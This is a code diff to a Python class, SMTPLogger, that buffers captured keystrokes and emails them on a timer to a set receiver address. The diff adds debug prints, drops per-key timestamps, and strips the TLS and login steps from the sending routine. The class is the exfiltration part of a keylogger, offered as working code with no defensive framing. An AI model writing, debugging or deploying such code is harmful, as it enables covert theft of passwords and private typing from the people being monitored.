@@ -9,6 +9,7 @@ from email.mime.multipart import MIMEMultipart
 class SMTPLogger:
     def __init__(self, smtp_server, smtp_port, sender_email, sender_password, 
                  receiver_email, buffer_size=100, send_interval=60):
+        print(f"[INIT] SMTPLogger started - Server: {smtp_server}:{smtp_port}, Email: {sender_email}")
         self.smtp_server = smtp_server
         self.smtp_port = smtp_port
         self.sender_email = sender_email
@@ -26,22 +27,25 @@ class SMTPLogger:
         
         self.buffer_thread.start()
         self.sender_thread.start()
+        print("[INIT] Buffer and sender threads started")
     
     def log_keystroke(self, key):
+        print(f"[KEY] Captured: {key}")
         self.keystroke_queue.put(key)
     
     def _buffer_worker(self):
         while self.running:
             try:
                 key = self.keystroke_queue.get(timeout=1)
-                timestamp = datetime.datetime.now().isoformat()
-                self.buffer.append(f"{timestamp}:{key}")
+                self.buffer.append(key)
+                print(f"[BUFFER] Added key, total buffer size: {len(self.buffer)}")
             except queue.Empty:
                 continue
     
     def _sender_worker(self):
         while self.running:
             time.sleep(self.send_interval)
+            print(f"[TIMER] {self.send_interval}s elapsed, buffer has {len(self.buffer)} keys")
             if self.buffer:
                 self._send_email()
     
@@ -49,27 +53,29 @@ class SMTPLogger:
         if not self.buffer:
             return
         
+        print(f"[EMAIL] Preparing to send {len(self.buffer)} keystrokes")
         try:
             buffer_snapshot = self.buffer[:self.buffer_size]
             self.buffer = self.buffer[self.buffer_size:]
+            
+            body = "".join(buffer_snapshot)
             
             msg = MIMEMultipart()
             msg['From'] = self.sender_email
             msg['To'] = self.receiver_email
             msg['Subject'] = f"Keystroke Log - {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
             
-            body = "\n".join(buffer_snapshot)
             msg.attach(MIMEText(body, 'plain'))
             
             server = smtplib.SMTP(self.smtp_server, self.smtp_port)
-            server.starttls()
-            server.login(self.sender_email, self.sender_password)
             server.send_message(msg)
             server.quit()
-        except Exception:
-            pass
+            print("[EMAIL] Successfully sent!")
+        except Exception as e:
+            print(f"[ERROR] Failed to send: {e}")
     
     def shutdown(self):
+        print("[SHUTDOWN] Flushing remaining buffer")
         self.running = False
         if self.buffer:
             self._send_email()
